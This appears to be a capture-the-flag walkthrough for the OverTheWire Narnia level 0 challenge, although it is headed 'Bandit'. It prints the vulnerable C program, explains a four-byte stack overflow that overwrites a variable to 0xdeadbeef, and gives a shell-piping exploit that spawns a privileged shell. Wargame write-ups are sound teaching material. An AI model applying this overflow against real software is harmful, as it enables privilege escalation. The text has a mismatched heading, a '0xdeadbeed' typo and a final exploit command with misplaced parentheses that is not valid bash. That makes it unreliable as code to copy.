
# OverTheWire

OverTheWire's challenges walkthrogh.


## Bandit
### level 0->1
We can connect using secure 
shell to the server with narnia0 as the 
user and narnia0 as the password. After we logged 
in we can see two files narnia0 and narnia0.c .

*narnia0.c*
```c
#include <stdio.h>
#include <stdlib.h>

int main(){
    long val=0x41414141;
    char buf[20];

    printf("Correct val's value from 0x41414141 -> 0xdeadbeef!\n");
    printf("Here is your chance: ");
    scanf("%24s",&buf);

    printf("buf: %s\n",buf);
    printf("val: 0x%08x\n",val);

    if(val==0xdeadbeef){
        setreuid(geteuid(),geteuid());
        system("/bin/sh");
    }
    else {
        printf("WAY OFF!!!!\n");
        exit(1);
    }
    return 0;
}
```
From the code we can see that there is buffer
that gets from the standard input 24 bytes while
the buffer is only contains 20 bytes of space. before
that buffer we can see that the program declered variable
that contains 4 bytes so on the stack we can overwrite
this variable by send to the standard input 24 bytes.
Important thing we need to notice is that the scanf
function takes string and we need to change 0x41414141 to 0xdeadbeed
so we need to provide the standard input the string
presentation of 0xdeadbeef in hex. 

We can do it by write in the bash:
```
echo -e '\xef\xbe\xad\xde'
```
So the exploit will be:
```
echo -e ('AAAABBBBCCCCEEEEFFFF\xef\xbe\xad\xde'; cat;) | ./narnia0
```









